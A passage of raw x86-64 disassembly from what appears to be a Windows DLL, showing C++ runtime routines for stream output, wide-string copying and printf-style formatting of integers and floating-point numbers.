jne r-xdata
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x70 ]
mov r8 rbx
mov rdx rsi
mov [ rsp + 0x20 ] r12
call sub_180017a9c
test eax eax
jle r-xdata
lea r9 [ rsp + 0x88 ]
mov r8 r13
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] r12
call sub_180017a9c
test eax eax
jle r-xdata
sub_180005d90
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_180005f70
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
lea rax [ r--data ]
mov [ rcx + 0x98 ] rax
mov [ rsp + 0x48 ] 0x1
lea rdx [ rcx + 0x18 ]
call sub_180005040
nop
mov rax [ rdi + 0x10 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi + 0x10 ] rax
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
lea rcx [ rdi + 0x18 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rdi + 0x18 ] rax
mov [ rdi + 0x88 ] 0x0
mov [ rdi + 0x90 ] 0x0
mov rax rdi
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_180006070
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rdx
mov rdx rcx
xor esi esi
mov [ rbp - 0x40 ] esi
mov eax [ rcx + 0x78 ]
test al 0x2
jne r-xdata
test al 0x4
jne r-xdata
mov rcx [ rcx + 0x48 ]
cmp [ rcx ] rsi
je r-xdata
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov r8 [ rdx + 0x40 ]
cmp [ r8 ] rsi
je r-xdata
mov rax [ rcx ]
mov r8 [ rdx + 0x70 ]
cmp r8 rax
cmovb r8 rax
mov rax [ rdx + 0x28 ]
mov rdx [ rax ]
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
sub r8 rdx
sar r8 0x1
lea rcx [ rbp - 0x30 ]
call sub_1800023b0
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rdx + 0x58 ]
movsxd rcx [ rax ]
mov rax [ r8 ]
lea r8 [ rax + rcx * 2 ]
mov rax [ rdx + 0x20 ]
mov rdx [ rax ]
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
sub r8 rdx
sar r8 0x1
lea rcx [ rbp - 0x30 ]
call sub_1800023b0
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x90 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_180018b3c
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rdi 0x8
jb r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_180018670
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_180018670
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_180018670
mov rcx [ rbp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
sub_180006300
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
call j_sub_18001c100
test al al
jne r-xdata
mov rdx [ rbx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx [ rbx ]
call sub_180007270
nop
add rsp 0x30
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_180006350
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xc8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r14 r9
mov r15 r8
mov rbx rdx
mov [ rbp - 0x69 ] rdx
movzx r13d [ rbp + 0x77 ]
test [ r9 + 0x18 ] 0x4000
jne r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx r9
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov rsi rax
xor r12d r12d
mov rdi [ rsp + 0x30 ]
test rdi rdi
je r-xdata
movups xmm0 [ r8 ]
movaps [ rbp - 0x69 ] xmm0
mov r10 [ rcx ]
movzx edx [ rbp + 0x7f ]
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x20 ] r13w
lea r8 [ rbp - 0x69 ]
mov rdx rbx
call [ r10 + 0x38 ]
jmp r-xdata
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
lea rdx [ rbp - 0x29 ]
mov rcx rsi
cmp [ rbp + 0x7f ] 0x0
je r-xdata
xor edx edx
lea rcx [ rbp - 0x79 ]
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_180018450
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
call sub_1800081e0
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
call sub_180008200
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
mov rbx r12
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x79 ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
jmp r-xdata
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi [ r14 + 0x28 ]
mov rsi [ rbp - 0x41 ]
test rdi rdi
jle r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_180018b3c
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_180018b3c
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_180018b3c
mov rdi r12
cmp rdi rsi
jbe r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_180018670
jmp r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_180018670
jmp r-xdata
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
lea r12 [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x8
cmovae r12 [ rbp - 0x51 ]
test rsi rsi
je r-xdata
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
sub rdi rsi
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
movups [ r15 ] xmm0
mov [ r14 + 0x28 ] 0x0
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x38 ]
movups [ r15 ] xmm0
mov rdi r12
mov rbx [ rsp + 0x38 ]
mov eax [ r14 + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov rbx [ rbp - 0x69 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x38 ]
mov esi 0xffff
nop [ rax ] eax
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_180018b3c
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x41 ]
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r13w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r13w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
add r12 0x2
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r13w
movzx eax r13w
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r13w
movzx eax r13w
jmp r-xdata
mov ecx 0xffff
cmp cx r8w
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp si ax
jne r-xdata
sub_180006730
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rsi rcx
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rcx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rcx [ rsp + 0x52 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x64
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x60 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x40
call sub_180018bd0
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_180007e10
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180018450
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_180006830
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rsi rcx
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rcx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rcx [ rsp + 0x52 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x75
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x60 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x40
call sub_180018bd0
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_180007e10
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180018450
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_180006930
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rsi rcx
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x64
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_180018bd0
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_180007e10
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180018450
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_180006a30
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rsi rcx
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x75
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_180018bd0
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_180007e10
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180018450
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_180006b30
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
movapd xmm0 xmm1
mulsd xmm0 [ r--data ]
ucomisd xmm0 xmm1
jpe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
je r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
comisd xmm1 xmm3
jbe r-xdata
cmp rsi 0x1388
jae r-xdata
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x2 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x3 ] 0x0
call sub_180018bd0
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx r12
call sub_1800072d0
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_180018450
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_180006d40
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
mov [ rax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
comisd xmm1 xmm3
jbe r-xdata
nop [ rax ] eax
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x4 ] 0x0
call sub_180018bd0
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx r12
call sub_1800072d0
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_180018450
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop [ rax + rax ] eax
cmp rsi 0x1388
jae r-xdata
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_180006f40
push rbx
push rsi
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov rdi r9
mov r9 [ rsp + 0xe8 ]
mov rbx rcx
mov rsi rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x50 ]
mov edx 0x40
movaps [ rsp + 0x40 ] xmm0
call sub_180018bd0
lea r8 [ rsp + 0x40 ]
mov r9 rdi
movsxd rdx eax
lea rax [ rsp + 0x50 ]
mov rcx rbx
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xe0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rsi
call sub_180007e10
mov rax rsi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_180018450
add rsp 0xa0
pop rdi
pop rsi
pop rbx
retn
sub_180006fe0
mov [ rsp + 0x8 ] rbx
